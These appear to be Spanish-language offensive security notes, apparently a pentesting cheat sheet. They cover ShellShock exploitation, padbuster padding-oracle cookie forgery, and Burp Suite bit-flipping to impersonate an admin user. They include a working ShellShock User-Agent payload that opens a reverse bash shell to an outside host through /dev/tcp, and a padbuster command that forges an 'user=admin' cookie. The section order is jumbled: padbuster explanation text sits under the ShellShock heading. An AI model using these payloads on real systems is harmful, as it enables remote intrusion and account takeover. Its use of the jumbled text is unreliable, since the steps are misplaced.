ShellShock


PADBUSTER

Para comprobar que estamos ante un ataque ShellShock debemos mirar en la URL de la web y ver que la extension de la pagina es pl,cgi,sh,etc. Para hacer un ataque ShellShock cambiaremos el user agent por un comando que queramos ejecutar en el sistema

User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

El numero 8 es el numero de bloques de encriptacion que podra variar. Una vez realizado esto sacaremos el texto en plano de la cookie por lo que podremos jugar con ella para hacernos pasar por ejemplo por el usuario admin

┌──(kali@kali)-[~]
└─$ padbuster http://10.0.0.1/login.php lacookieencriptada 8 -cookie "nombredelacookie=lacookieencriptada" -encoding 0 -plaintext "user=admin"


Una vez que nos saque la cookie la introduciremos en el navegador para asi poder loguear como admin


FLIPPER ATTACK BURPSUITE

Como la encriptacion se realiza por bloques podemos jugar con estos para obtener un usuario, por ejemplo podemos usar bdmin como usuario ya que el bloque que cambiara sera el primero ya que la parte de “dmin” sera igual a la de admin

Para ello en el panel de intruder del burpsuite cambiaremos la cookie de sesion, para configurarlo en payload type seleccionaremos la opcion "Bit Flipper" y en las opciones de bit flipper seleccionamos la opcion “Literal Value”
